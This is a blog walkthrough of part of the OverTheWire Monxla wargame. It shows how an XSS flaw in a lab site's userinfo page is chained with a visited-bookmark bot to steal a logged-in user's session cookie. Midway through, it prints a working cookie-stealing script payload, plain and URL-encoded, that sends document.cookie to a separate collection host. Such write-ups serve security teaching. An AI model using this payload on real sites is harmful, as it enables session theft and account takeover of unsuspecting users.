---
title: "OverTheWire Monxla Part 2"
date: "2012-11-25T05:05:00-05:00"
comments: true
highlight: "true"
categories:
 - overthewire
 - wargames
 - linux
 - monxla
aliases:
 - "/2012/11/26/overthewire-monxla-part-2"
 - "/2012/11/overthewire-monxla-part-2.html"
---

In the previous post, I showed how to get the PDF that outlines the services running on the Monxla VM image. This article will continue where that one left off.

<!-- more -->

Firstly, the PDF explains that there are 2 virtual hosts enabled on the machine. To configure my machine for these virtual hosts, I added these lines to my /etc/hosts file: 

```
192.168.188.134 nasenko.otw
192.168.188.134 honeylink.otw
```

There are 2 sites immediately available to you:

* The HoneyLink site is, so far, just a convenience for the wargame, so you don't have to setup your own HTTP server.  It gives you a prefix URL, that you can prepend anything you want to the end.  It will then show you the responses as they come in. {{% figure class="img-responsive" src="/img/monxla2_2.png" %}}
* The Nasenko home page. This is what appears to be the main application that we are attacking. It has a Bookmark Service, and the Notes service, which were referenced in the PDF, immediately visible. {{% figure class="img-responsive" src="/img/monxla2_1.png" %}}

After poking around a bit, I found that you are unable to access the Notes service, since you're not logged in. Per the blog article on the main page, login attempts are disabled. On the Bookmarks page, it says that the submitted bookmarks are being visited routinely. These two statements combined immediately made me think of using a [Session Hijacking](https://en.wikipedia.org/wiki/Session_hijacking) attack to steal the session of the user already logged in, checking the submitted bookmarks. 

To get started with my attack, I tried submitting several bookmarks, which were always rejected.  There was some sort of filtering going on, on the server side.  For some reason, I decided to try submitting the Nasenko site itself, and saw that it was actually accepted.  This means that I could at least submit data, as long as it was from the same website.  From there, that made me start thinking about finding a [Cross-Site Scripting](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerability, so that I could redirect the traffic, and combine it with the Session Hijack attack. 

After searching for a bit, I found a Cross-Site Scripting vulnerability in the User Info page.  It wasn't cleanly filtering user input, so I was able to inject javascript into the "username" parameter. 

{{% figure class="img-responsive" src="/img/monxla2_3.png" %}}

To combine these two attacks, I crafted a URL that would use the Cross-Site Scripting attack to allow me to submit it from the proper host, as well as stealing the user's cookie: 

```
http://nasenko.otw/userinfo.php?username=<script>document.location='http://honeylink.otw/tH3zwj4P1z/cookie'+document.cookie;</script> 
```

However, due to some URL encoding issues (mainly the "+" splitting the parameter), I had to URL encode it using the [Burp Suite](http://portswigger.net/burp/): 

```
http://nasenko.otw/userinfo.php?username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%68%6f%6e%65%79%6c%69%6e%6b%2e%6f%74%77%2f%74%48%33%7a%77%6a%34%50%31%7a%2f%63%6f%6f%6b%69%65%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3c%2f%73%63%72%69%70%74%3e
```

I submitted the URL to the Bookmark Service, and it gladly accepted it.  I then switched to the HoneyLink page, and clicked the "Refresh" button, and saw that my click had indeed been registered.  And lucky for me, it had the cookie listed:

{{% figure class="img-responsive" src="/img/monxla2_4.png" %}}

I then added a cookie with the stolen value. 

{{% figure class="img-responsive" src="/img/monxla2_5.png" %}}

When I then went to the Notes Service, which previously denied me access, I was able to view them. This meant it was successful. We successfully stole a valid user's session.

{{% figure class="img-responsive" src="/img/monxla2_6.png" %}}
